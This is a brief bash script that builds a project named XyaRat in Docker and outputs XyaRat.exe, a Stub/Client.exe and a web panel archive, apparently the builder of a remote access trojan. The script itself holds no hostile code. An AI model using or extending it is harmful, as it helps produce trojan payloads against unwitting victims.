#!/bin/bash

# Quick build script using Docker
set -e

echo "🐋 Building XyaRat with Docker..."

# Build Docker image
docker build -t xyarat-builder .

# Run build in container and copy output
docker run --rm -v "$(pwd)/output:/output" xyarat-builder bash -c "
    ./build.sh && \
    cp -r Binaries/Release/* /output/ && \
    cp XyaRat.zip /output/ 2>/dev/null || true && \
    cp WebPanel.zip /output/ 2>/dev/null || true
"

echo ""
echo "✅ Build complete!"
echo "📦 Output files in: ./output/"
echo ""
echo "Executables:"
echo "  - output/XyaRat.exe"
echo "  - output/Stub/Client.exe"
